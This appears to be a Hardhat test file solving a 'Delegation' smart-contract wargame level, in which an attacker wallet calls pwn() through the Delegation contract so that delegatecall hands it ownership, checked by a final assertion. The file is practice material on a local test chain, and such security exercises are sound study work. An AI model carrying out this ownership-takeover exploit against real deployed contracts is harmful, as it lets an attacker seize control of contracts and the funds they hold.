const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Delegation";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const DelegateFactory = await ethers.getContractFactory("Delegate");
        const delegateContract = await DelegateFactory.deploy(owner.address);

        const DelegationFactory = await ethers.getContractFactory("Delegation");
        const delegationContract = await DelegationFactory.deploy(delegateContract.address);

        return { owner, delegationContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, delegationContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, delegationContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            let delegateContract = await ethers.getContractAt(
                "Delegate",
                delegationContract.address,
                owner,
            );

            await delegateContract.connect(attackerWallet).pwn();
        });

        after(async function () {
            expect(await delegationContract.owner.call()).to.be.equal(attackerWallet.address);
        });
    });
});